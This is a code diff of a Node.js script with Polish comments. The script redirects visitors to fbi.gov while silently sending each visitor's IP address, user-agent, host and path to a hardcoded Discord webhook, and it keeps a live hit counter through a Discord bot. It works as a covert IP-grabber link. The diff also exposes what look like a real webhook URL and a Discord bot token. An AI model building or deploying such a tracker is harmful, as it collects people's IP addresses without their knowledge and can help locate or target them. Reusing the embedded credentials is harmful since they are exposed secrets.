@@ -6,7 +6,7 @@ const { URL } = require('url');
 // ===== KONFIGURACJA =====
 const REDIRECT_URL = 'https://www.fbi.gov/';
 const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE';
-const BOT_TOKEN = 'MTQ3NjAwMzcwODEwNTEzNDExMA.G2OIul.3fVojuSqE55cRm4ymZa81031nr_TZDIrxHUBPo';
+const BOT_TOKEN = 'MTQ3ODQ4MjY1MDA3NDMxNjg4MQ.Gecy9t.Mn6UlZ6buzL6CHnxEApxmRSNPiwYPj8eYZohzg'; // << WKLEJ TUTAJ NOWY RESETOWANY TOKEN!
 const PREFIX = '.';
 const PORT = process.env.PORT || 80;
 // ========================
@@ -22,32 +22,35 @@ const client = new Client({
     ],
 });
 
-// ─── Funkcja: Edycja wiadomości bota ──────────────────────────────────────────
+// ─── Funkcja: Edycja wiadomości bota (TYLKO TUTAJ JEST LICZNIK) ───────────────
 async function updateBotStats() {
     if (!activeStatsMessage) return;
     const embed = new EmbedBuilder()
-        .setTitle('📊 STATYSTYKI REDIRECTA — NA ŻYWO')
+        .setTitle('📊 STATYSTYKI — NA ŻYWO')
         .setColor(0x5865F2)
         .addFields(
-            { name: '🔗 Cel', value: `\`${REDIRECT_URL}\``, inline: false },
-            { name: '📊 Łącznie wejść', value: `\`${totalRedirectHits}\``, inline: true },
-            { name: '🟢 Status', value: '`Nasłuchiwanie...`', inline: true }
+            { name: '🔗 Cel Redirectu', value: `\`${REDIRECT_URL}\``, inline: false },
+            { name: '� ŁĄCZNIE WEJŚĆ', value: `\`${totalRedirectHits}\``, inline: true },
+            { name: '🟢 Status', value: '`Monitorowanie...`', inline: true }
         )
         .setTimestamp();
-    try { await activeStatsMessage.edit({ content: '', embeds: [embed] }); } catch (e) { activeStatsMessage = null; }
+    try {
+        await activeStatsMessage.edit({ content: '', embeds: [embed] });
+    } catch (e) {
+        activeStatsMessage = null;
+    }
 }
 
-// ─── Funkcja: Pełny Webhook Logger ───────────────────────────────────────────
-function sendFullWebhook({ ip, method, path, userAgent, host, platform }) {
+// ─── Funkcja: Webhook (BEZ LICZNIKA - TYLKO LOGI) ───────────────────────────
+function sendRedirectWebhook({ ip, method, path, userAgent, host, platform }) {
     const body = JSON.stringify({
         embeds: [{
-            title: `🌐 Nowe wejście (${platform})`,
-            color: 0x57F287,
+            title: `🌐 Log Wejścia (${platform})`,
+            color: 0x2F3136,
             fields: [
                 { name: '🖥️ IP', value: `\`${ip || 'brak'}\``, inline: true },
                 { name: '📄 Ścieżka', value: `\`${path || '/'}\``, inline: true },
                 { name: '📬 Metoda', value: `\`${method || 'GET'}\``, inline: true },
-                { name: '📈 Licznik', value: `\`${totalRedirectHits}\``, inline: true },
                 { name: '🔗 Host', value: `\`${host || 'brak'}\``, inline: true },
                 { name: '🔍 User-Agent', value: `\`${(userAgent || 'brak').slice(0, 250)}\``, inline: false },
             ],
@@ -63,28 +66,21 @@ function sendFullWebhook({ ip, method, path, userAgent, host, platform }) {
         headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
     }, (res) => { if (res.statusCode !== 204) console.warn('Błąd Webhooka:', res.statusCode); });
 
-    req.on('error', (e) => console.error('Webhook Error:', e.message));
+    req.on('error', () => { });
     req.write(body);
     req.end();
 }
 
-// ─── Serwer lokalny: Obsługa requestu ─────────────────────────────────────────
-async function handleLocalRequest(req) {
+// ─── Wspólna logika obsługi requestu ──────────────────────────────────────────
+async function processHit(data) {
     totalRedirectHits++;
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+    console.log(`[ENTRY] #${totalRedirectHits} from ${data.ip}`);
 
-    // 1. Edytuj wiadomość bota
+    // 1. Edytuj wiadomość bota (Licznik go góry!)
     updateBotStats();
 
-    // 2. Poślij pełny webhook
-    sendFullWebhook({
-        ip,
-        method: req.method,
-        path: req.url,
-        userAgent: req.headers['user-agent'],
-        host: req.headers['host'],
-        platform: 'Lokalnie'
-    });
+    // 2. Poślij webhooka (Bez licznika!)
+    sendRedirectWebhook(data);
 }
 
 // ─── Discord Bot Komendy ─────────────────────────────────────────────────────
@@ -94,14 +90,14 @@ client.on('messageCreate', async (message) => {
 
     if (command === 'start') {
         totalRedirectHits = 0;
-        activeStatsMessage = await message.channel.send('🚀 Rozpoczynam monitorowanie...');
-        updateBotStats();
+        const embed = new EmbedBuilder().setTitle('🚀 Monitorowanie wystartowało!').setColor(0xFFA500);
+        activeStatsMessage = await message.channel.send({ embeds: [embed] });
         await message.delete().catch(() => { });
     }
 
     if (command === 'stop') {
         if (activeStatsMessage) {
-            await activeStatsMessage.edit({ content: '🛑 Zatrzymano.', embeds: [] });
+            await activeStatsMessage.edit({ content: '🛑 Zatrzymano licznik.', embeds: [] });
             activeStatsMessage = null;
         }
     }
@@ -109,18 +105,17 @@ client.on('messageCreate', async (message) => {
 
 // ─── NETLIFY (Serverless) ────────────────────────────────────────────────────
 exports.handler = async (event) => {
-    totalRedirectHits++;
-    const ip = event.headers['x-forwarded-for']?.split(',')[0] || event.headers['x-nf-client-connection-ip'] || 'brak';
-
-    // Webhook na Netlify
-    sendFullWebhook({
-        ip,
+    const data = {
+        ip: event.headers['x-forwarded-for']?.split(',')[0] || event.headers['x-nf-client-connection-ip'] || 'brak',
         method: event.httpMethod,
         path: event.path,
         userAgent: event.headers['user-agent'],
         host: event.headers['host'],
         platform: 'Netlify'
-    });
+    };
+
+    // Na Netlify licznik bota nie zadziała (funkcja zaraz zniknie), ale webhook tak
+    await processHit(data);
 
     return {
         statusCode: 302,
@@ -131,13 +126,34 @@ exports.handler = async (event) => {
 
 // ─── LOKALNY START ──────────────────────────────────────────────────────────
 if (require.main === module) {
-    if (process.env.NETLIFY) process.exit(0);
+    // Jeśli Netlify odpala to jako build command - wyjdź bez błędu
+    if (process.env.NETLIFY) {
+        console.log('Netlify build - OK.');
+        process.exit(0);
+    }
 
+    // Start serwera HTTP (Lokalnie)
     http.createServer((req, res) => {
         res.writeHead(302, { 'Location': REDIRECT_URL, 'Cache-Control': 'no-store' });
         res.end();
-        handleLocalRequest(req);
-    }).listen(PORT, '0.0.0.0', () => console.log(`✅ Serwer na porcie ${PORT}`));
+        processHit({
+            ip: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
+            method: req.method,
+            path: req.url,
+            userAgent: req.headers['user-agent'],
+            host: req.headers['host'],
+            platform: 'Lokalnie'
+        });
+    }).listen(PORT, '0.0.0.0', () => console.log(`✅ Serwer lokalny na porcie ${PORT}`));
 
-    client.login(BOT_TOKEN).catch(e => console.error('❌ Błąd bota:', e.message));
+    // Start bota z obsługą błędów (żeby nie wywalało serwera)
+    console.log('🤖 Logowanie bota...');
+    client.login(BOT_TOKEN).catch(e => {
+        console.error('❌ BŁĄD BOTA (Pewnie zły token):', e.message);
+        console.log('👉 Wejdź na Discord Dev Portal i zrób RESET TOKENU.');
+    });
 }
+
+client.once('ready', () => {
+    console.log(`✅ Bot gotowy jako ${client.user.tag}`);
+});
